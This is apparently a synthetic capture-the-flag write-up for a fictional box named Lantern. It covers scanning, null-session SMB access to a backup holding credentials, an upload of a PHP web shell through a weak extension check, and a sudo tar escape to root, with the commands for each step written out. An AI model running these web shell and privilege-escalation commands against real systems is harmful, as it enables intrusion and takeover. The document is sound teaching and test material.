# Lantern (retired, easy) — synthetic sample writeup

Fictional box used to test the copilot tooling. Target 10.10.11.42.

## Recon

A full TCP scan first, then versions on what is open.

```bash
nmap -p- --min-rate 2000 -oA scans/all 10.10.11.42
nmap -sC -sV -p22,80,445 -oA scans/svc 10.10.11.42
```

SSH, an nginx site on 80 and SMB on 445. The site redirects to lantern.htb, so add it to /etc/hosts.

## Enumeration

### SMB

Null session is allowed and lists a readable `backups` share.

```bash
smbclient -N -L //10.10.11.42
smbclient -N //10.10.11.42/backups -c 'ls'
```

The share holds an old `site-config.bak` with database settings for the web app.

### Web

Directory brute force finds an admin panel.

```bash
gobuster dir -u http://lantern.htb -w /usr/share/wordlists/dirb/common.txt -x php
```

`/admin/login.php` accepts the database credentials from the backup file.

## Foothold

The admin panel has a file upload that only checks the extension client-side. Uploading a PHP web shell gives code
execution as www-data.

```bash
curl -s http://lantern.htb/uploads/shell.php?cmd=id
```

## Privilege escalation

`sudo -l` shows www-data may run `/usr/bin/tar` as root without a password. GTFOBins has the escape.

```bash
sudo -l
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Root shell.
